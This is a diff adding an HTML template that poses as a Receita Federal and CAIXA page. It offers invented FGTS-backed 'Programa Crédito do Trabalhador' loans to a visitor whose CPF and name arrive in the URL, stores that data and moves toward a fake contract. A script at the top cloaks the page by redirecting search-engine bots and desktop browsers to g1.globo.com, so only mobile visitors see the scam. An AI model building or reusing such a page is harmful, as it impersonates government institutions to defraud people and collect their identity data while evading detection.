@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html data-template="opcoes-emprestimo">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Opções de Empréstimo</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script>
+    // Função para detectar se é um dispositivo móvel
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Função para detectar se é um bot
+    function isBot() {
+      const botAgents = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+      ];
+
+      return botAgents.some(bot => navigator.userAgent.includes(bot));
+    }
+
+    // Função para verificar se a largura da janela é maior que 768px
+    function isWideScreen() {
+      return window.innerWidth > 768;
+    }
+
+    // Redirecionar ou bloquear o acesso
+    function checkAccess() {
+      if (isBot() || (!isMobile() && isWideScreen())) {
+        // Redirecionar para o site G1 se o acesso for bloqueado
+        window.location.href = "https://g1.globo.com/";
+      }
+    }
+
+    // Executar a função de verificação ao carregar a página
+    window.onload = checkAccess;
+
+    // Adicionar um listener para verificar novamente se a janela for redimensionada
+    window.addEventListener('resize', checkAccess);
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 100px; /* Reduced logo size */
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        .info-box {
+            border-left: 4px solid #1351b4; /* Changed color */
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: auto; /* Removed fixed height */
+        }
+        .footer {
+            background-color: #1351b4; /* Changed color */
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+        }
+        .select-loan {
+            width: 100%; 
+            padding: 10px; 
+            background-color: #1351b4; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: background-color 0.3s ease;
+        }
+        .select-loan:hover {
+            background-color: #092555;
+        }
+        @keyframes pulseButton {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+    </style>
+    {% include 'shared_resources.html' %}
+</head>
+<body class="opcoes-emprestimo-page">
+    <div class="container">
+        <div class="info-box">
+            <div id="loadingContainer">
+                <!-- Área para exibir as opções de empréstimo -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Obter dados da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const cpf = urlParams.get('cpf');
+            const nome = urlParams.get('nome');
+
+            if (!cpf || !nome) {
+                window.location.href = '/buscar-cpf';
+                return;
+            }
+
+            // Configurar página de opções de empréstimo
+            const loadingContainer = document.getElementById('loadingContainer');
+            
+            // Cálculos para empréstimos
+            // Opção 1: R$ 4.000,00 com parcela máxima de R$ 48,00
+            const valor1 = 4000;
+            const parcela1 = 48;
+            const meses1 = Math.ceil(valor1 / parcela1 * 1.019); // Considerando juros de 1,9% ao mês
+
+            // Opção 2: R$ 6.000,00 com parcela máxima de R$ 68,00
+            const valor2 = 6000;
+            const parcela2 = 68;
+            const meses2 = Math.ceil(valor2 / parcela2 * 1.019);
+
+            // Opção 3: R$ 10.000,00 com parcela máxima de R$ 118,00
+            const valor3 = 10000;
+            const parcela3 = 118;
+            const meses3 = Math.ceil(valor3 / parcela3 * 1.019);
+
+            loadingContainer.innerHTML = `
+                <div style="margin: 25px 0; padding: 15px; background-color: #1451B4; border-radius: 4px; color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+                    <div style="font-weight: 700; font-size: 18px; margin-bottom: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
+                        Análise de crédito concluída
+                    </div>
+                    <div style="font-weight: 600; margin-bottom: 8px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
+                        Nome: ${nome}
+                    </div>
+                    <div style="font-weight: 600; margin-bottom: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
+                        CPF: ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")}
+                    </div>
+                    <p style="margin-bottom: 10px; text-shadow: 0 1px 1px rgba(0,0,0,0.15); color: white;">
+                        Com base no seu histórico profissional e saldo do FGTS, você tem direito a 
+                        condições especiais no <strong>Programa Crédito do Trabalhador</strong>.
+                    </p>
+                    <p style="text-shadow: 0 1px 1px rgba(0,0,0,0.15); color: white;">
+                        <strong>Taxa de juros:</strong> 1,9% ao mês<br>
+                        <strong>Forma de pagamento:</strong> Desconto direto no FGTS todo dia 10<br>
+                        <strong>Vantagens:</strong> Sem comprometer seu salário, sem consulta ao SPC/Serasa
+                    </p>
+                </div>
+
+                <h3 style="text-align: center; margin: 25px 0 15px; font-size: 18px; color: #1351b4;">
+                    Opções de Empréstimo Disponíveis
+                </h3>
+
+                <div style="display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px;">
+                    <!-- Opção 1 -->
+                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 4.000,00</div>
+                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                Básico
+                            </div>
+                        </div>
+                        <div style="margin-bottom: 15px;">
+                            <div><strong>Parcela máxima:</strong> R$ 48,00 mensais</div>
+                            <div><strong>Prazo total:</strong> ${meses1} meses</div>
+                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                        </div>
+                        <button class="select-loan" data-value="4000" data-monthly="${parcela1}" data-term="${meses1}">
+                            <i class="fas fa-check-circle"></i> Selecionar
+                        </button>
+                    </div>
+
+                    <!-- Opção 2 -->
+                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 6.000,00</div>
+                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                Intermediário
+                            </div>
+                        </div>
+                        <div style="margin-bottom: 15px;">
+                            <div><strong>Parcela máxima:</strong> R$ 68,00 mensais</div>
+                            <div><strong>Prazo total:</strong> ${meses2} meses</div>
+                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                        </div>
+                        <button class="select-loan" data-value="6000" data-monthly="${parcela2}" data-term="${meses2}">
+                            <i class="fas fa-check-circle"></i> Selecionar
+                        </button>
+                    </div>
+
+                    <!-- Opção 3 -->
+                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 10.000,00</div>
+                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                Premium
+                            </div>
+                        </div>
+                        <div style="margin-bottom: 15px;">
+                            <div><strong>Parcela máxima:</strong> R$ 118,00 mensais</div>
+                            <div><strong>Prazo total:</strong> ${meses3} meses</div>
+                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                        </div>
+                        <button class="select-loan" data-value="10000" data-monthly="${parcela3}" data-term="${meses3}">
+                            <i class="fas fa-check-circle"></i> Selecionar
+                        </button>
+                    </div>
+                </div>
+
+                <p style="text-align: center; color: #666; font-size: 14px; margin-bottom: 20px;">
+                    Selecione uma opção acima para prosseguir com a contratação do empréstimo.
+                </p>
+            `;
+
+            // Adicionar eventos aos botões de seleção
+            document.querySelectorAll('.select-loan').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    // Mudar o botão para cor azul escuro quando clicado
+                    e.currentTarget.style.backgroundColor = '#092555';
+                    const loanValue = e.currentTarget.getAttribute('data-value');
+                    const monthlyPayment = e.currentTarget.getAttribute('data-monthly');
+                    const loanTerm = e.currentTarget.getAttribute('data-term');
+                    
+                    // Salvar dados do usuário no localStorage
+                    const userData = {
+                        nome: nome,
+                        cpf: cpf
+                    };
+                    localStorage.setItem('userData', JSON.stringify(userData));
+
+                    // Salvar dados do empréstimo em separado para a página de contrato
+                    const loanData = {
+                        amount: loanValue,
+                        monthly: monthlyPayment,
+                        term: loanTerm
+                    };
+                    localStorage.setItem('loanData', JSON.stringify(loanData));
+
+                    // Criar e mostrar tela de carregamento
+                    const loadingScreen = document.createElement('div');
+                    loadingScreen.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        background-color: rgba(255, 255, 255, 0.95);
+                        z-index: 2000;
+                    `;
+
+                    loadingScreen.innerHTML = `
+                        <div style="width: 80px; height: 80px; border: 5px solid #f3f3f3; 
+                                    border-top: 5px solid #1351b4; border-radius: 50%; 
+                                    animation: spin 1s linear infinite;"></div>
+                        <div style="margin-top: 20px; font-size: 18px; font-weight: 600; color: #1351b4;">
+                            Gerando contrato com a CAIXA
+                        </div>
+                        <div style="margin-top: 10px; max-width: 300px; text-align: center; color: #666;">
+                            Aguarde enquanto preparamos sua documentação
+                        </div>
+                    `;
+
+                    document.body.appendChild(loadingScreen);
+
+                    // Adicionar estilo da animação
+                    if (!document.getElementById('spinAnimation')) {
+                        const style = document.createElement('style');
+                        style.id = 'spinAnimation';
+                        style.textContent = `
+                            @keyframes spin {
+                                0% { transform: rotate(0deg); }
+                                100% { transform: rotate(360deg); }
+                            }
+                        `;
+                        document.head.appendChild(style);
+                    }
+
+                    // Redirecionar após 5 segundos
+                    setTimeout(() => {
+                        window.location.href = `/?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}&loan_amount=${loanValue}`;
+                    }, 5000);
+                });
+            });
+        });
+    </script>
+
+    <footer class="footer">
+        <p>© Todos os direitos reservados.</p>
+    </footer>
+</body>
+</html> 
